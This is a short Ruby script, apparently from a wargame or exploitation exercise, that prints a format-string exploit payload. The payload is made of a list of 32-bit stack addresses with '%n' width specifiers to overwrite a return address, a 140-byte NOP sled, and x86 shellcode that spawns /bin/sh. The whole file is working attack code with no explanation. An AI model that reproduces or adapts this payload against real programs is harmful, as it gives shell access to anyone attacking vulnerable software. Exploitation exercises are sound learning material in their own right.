#!/usr/bin/env ruby

shellcode = ""
shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46"
shellcode += "\x07\x89\x4c\x0c\xb0\x0b"
shellcode += "\x89\xf3\x8d\x4e\x08\x8d\x56"
shellcode += "\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
shellcode += "\x80\xe8\xdc\xff\xff\xff/bin/sh"

addr_overwrite = ""
addr_overwrite += "\x8c\xfd\xff\xbfjunk"
addr_overwrite += "\x8d\xfd\xff\xbfjunk"
addr_overwrite += "\x8e\xfd\xff\xbfjunk"
addr_overwrite += "\x8f\xfd\xff\xbf"
addr_overwrite += "%4x%4x"
addr_overwrite += "%214x%n"
addr_overwrite += "%250x%n"
addr_overwrite += "%259x%n"
addr_overwrite += "%280000x%n"

puts addr_overwrite + "\x90" * 140 + shellcode

